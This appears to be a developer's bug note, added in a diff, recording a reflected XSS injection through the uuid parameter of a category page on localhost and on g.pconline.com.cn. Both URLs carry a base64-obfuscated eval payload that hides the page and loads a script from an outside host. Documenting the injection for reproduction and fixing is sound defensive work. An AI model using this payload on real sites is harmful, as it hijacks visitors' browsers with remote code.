@@ -1,0 +1,11 @@
+分类页uuid被xss注入
+http://localhost:9991/wap/category_list.jsp?categoryId=493
+&uuid=1111%22;top[%27eval%27](atob(%27ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmhpZGRlbj0xO3Y9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7di5zcmM9Ii8vYXBpLnNoaWNhaTE2ODguY24vYXBpL2Z4YXBpL3RuZ3IuanM/eT0iK0RhdGUubm93KCk7ZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZCh2KTt0aHJvdyAw%27));//
+&wxzd=ok_xhb
+&from=groupmessage#ad=8481
+
+http://localhost:9991/wap/category_list.jsp?categoryId=493
+https://g.pconline.com.cn/best/fenlei-493/youhui/?uuid=1111%22;top[%27eval%27](atob(%27ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmhpZGRlbj0xO3Y9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7di5zcmM9Ii8vYXBpLnNoaWNhaTE2ODguY24vYXBpL2Z4YXBpL3RuZ3IuanM/eT0iK0RhdGUubm93KCk7ZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZCh2KTt0aHJvdyAw%27));//&wxzd=ok_xhb&from=groupmessage#ad=8481
+
+
+
